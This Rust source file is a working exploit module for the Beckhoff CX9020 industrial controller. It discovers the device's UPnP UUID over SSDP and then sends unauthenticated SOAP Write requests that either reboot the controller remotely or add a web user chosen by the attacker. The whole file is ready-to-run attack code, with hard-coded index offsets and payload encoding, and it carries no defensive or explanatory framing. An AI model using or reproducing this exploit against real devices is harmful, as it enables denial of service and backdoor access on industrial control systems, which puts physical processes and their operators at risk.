use anyhow::{bail, Result};
use base64::{engine::general_purpose, Engine};
use std::net::UdpSocket;
use std::time::Duration;

const INDEX_ACTIVE_REBOOT: &str = "1329528576";
const INDEX_INACTIVE_REBOOT: &str = "1330577152";
const INDEX_ACTIVE_USER: &str = "1339031296";
const INDEX_INACTIVE_USER: &str = "1340079872";
pub const DEFAULT_WEB_PORT: u16 = 5120;

fn get_uuid(target_ip: &str) -> Option<String> {
    let msg = format!(
        "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\nST: upnp:rootdevice\r\n\r\n"
    );
    let sock = UdpSocket::bind("0.0.0.0:0").ok()?;
    sock.set_read_timeout(Some(Duration::from_secs(10))).ok()?;
    sock.send_to(msg.as_bytes(), format!("{target_ip}:1900"))
        .ok()?;

    let mut buf = [0u8; 1024];
    let n = sock.recv(&mut buf).ok()?;
    let resp = String::from_utf8_lossy(&buf[..n]);

    for line in resp.lines() {
        let lower = line.to_lowercase();
        if lower.contains(":uuid") {
            if let Some(s) = line.get(9..45.min(line.len())) {
                return Some(s.to_string());
            }
        }
    }
    None
}

fn soap_write(target_ip: &str, port: u16, uuid: &str, index_offset: &str, pdata: &str) -> bool {
    let soap = format!(
        r#"<?xml version="1.0" encoding="utf-8"?><s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:Write xmlns:u="urn:beckhoff.com:service:cxconfig:1"><netId></netId><nPort>0</nPort><indexGroup>0</indexGroup><IndexOffset>-{index_offset}</IndexOffset><pData>{pdata}</pData></u:Write></s:Body></s:Envelope>"#
    );

    let path = format!("/upnpisapi?uuid:{uuid}+urn:beckhoff.com:serviceId:cxconfig");
    let url = format!("http://{target_ip}:{port}{path}");

    let agent = ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(10))
        .timeout_read(Duration::from_secs(10))
        .build();

    match agent
        .post(&url)
        .set("Content-Type", "text/xml; charset=utf-8")
        .set("SOAPAction", "urn:beckhoff.com:service:cxconfig:1#Write")
        .send_string(&soap)
    {
        Ok(_) => {
            println!("SOAP Write succeeded.");
            true
        }
        Err(e) => {
            println!("SOAP Write failed: {e}");
            false
        }
    }
}

/// Reboot a Beckhoff CX9020 via unauthenticated SOAP. Pass `port = 0` for default (5120).
pub fn reboot(target_ip: &str, port: u16) -> Result<bool> {
    validate_ipv4(target_ip)?;
    let effective_port = if port == 0 { DEFAULT_WEB_PORT } else { port };

    let uuid = match get_uuid(target_ip) {
        Some(u) => u,
        None => bail!("Could not discover UPnP UUID for {target_ip}"),
    };
    println!("UUID: {uuid}");

    if soap_write(
        target_ip,
        effective_port,
        &uuid,
        INDEX_INACTIVE_REBOOT,
        "AQAAAAAA",
    ) {
        return Ok(true);
    }
    Ok(soap_write(
        target_ip,
        effective_port,
        &uuid,
        INDEX_ACTIVE_REBOOT,
        "AQAAAAAA",
    ))
}

/// Add a web user via unauthenticated SOAP. Pass `port = 0` for default (5120).
pub fn add_user(target_ip: &str, port: u16, username: &str, password: &str) -> Result<bool> {
    validate_ipv4(target_ip)?;
    let effective_port = if port == 0 { DEFAULT_WEB_PORT } else { port };
    if username.len() > 15 {
        anyhow::bail!("Username must be 15 characters or fewer (CX9020 limit)");
    }
    if password.len() > 15 {
        anyhow::bail!("Password must be 15 characters or fewer (CX9020 limit)");
    }

    let uuid = match get_uuid(target_ip) {
        Some(u) => u,
        None => bail!("Could not discover UPnP UUID for {target_ip}"),
    };

    let concat = format!("{username}{password}");
    let mut full: Vec<u8> = Vec::new();
    full.push((16 + concat.len()) as u8);
    full.extend_from_slice(&[0, 0, 0]);
    full.push(username.len() as u8);
    full.extend_from_slice(&[0u8; 7]);
    full.push(password.len() as u8);
    full.extend_from_slice(&[0u8; 3]);
    full.extend_from_slice(concat.as_bytes());

    // Pad until base64 has no trailing '='
    while general_purpose::STANDARD.encode(&full).ends_with('=') {
        full.push(0);
    }

    let pdata = general_purpose::STANDARD.encode(&full);
    println!("Adding user '{username}' with SOAP payload");

    if soap_write(
        target_ip,
        effective_port,
        &uuid,
        INDEX_INACTIVE_USER,
        &pdata,
    ) {
        return Ok(true);
    }
    Ok(soap_write(
        target_ip,
        effective_port,
        &uuid,
        INDEX_ACTIVE_USER,
        &pdata,
    ))
}

fn validate_ipv4(ip: &str) -> Result<()> {
    if ip.parse::<std::net::Ipv4Addr>().is_err() {
        bail!("Invalid IPv4 address: {ip}");
    }
    Ok(())
}
